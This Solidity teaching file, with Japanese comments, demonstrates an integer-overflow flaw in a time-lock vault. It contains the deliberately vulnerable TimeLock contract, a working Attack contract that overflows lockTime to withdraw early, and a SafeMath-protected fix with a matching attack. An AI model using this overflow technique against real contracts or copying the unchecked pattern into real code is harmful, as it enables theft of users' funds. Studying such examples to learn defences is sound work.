// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

import {SafeMath} from "./interactions/SafeMath.sol";

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        //1週間後に引き出せるようにする
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    //withdrawできるようになるまでの時間を延長する
    //但し、lockTimeがuintの最大値を超えると、lockTimeが0からになってしまう
    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}
    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        lockTimeを１週間ではなく、0にする
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}


contract ProtectedTimeLock {
    //uintに対してSafeMathを使う
    using SafeMath for uint;

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        // lockTime[msg.sender] += _secondsToIncrease;
        //以下のようにaddを使う
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract ProtectedTimeLockAttack {
    ProtectedTimeLock protectedTimeLock;

    constructor(ProtectedTimeLock _protectedTimeLock) {
        protectedTimeLock = ProtectedTimeLock(_protectedTimeLock);
    }

    receive() external payable {}
    fallback() external payable {}

    function attack() public payable {
        protectedTimeLock.deposit{value: msg.value}();
        protectedTimeLock.increaseLockTime(
            type(uint).max + 1 - protectedTimeLock.lockTime(address(this))
        );
        protectedTimeLock.withdraw();
    }
}
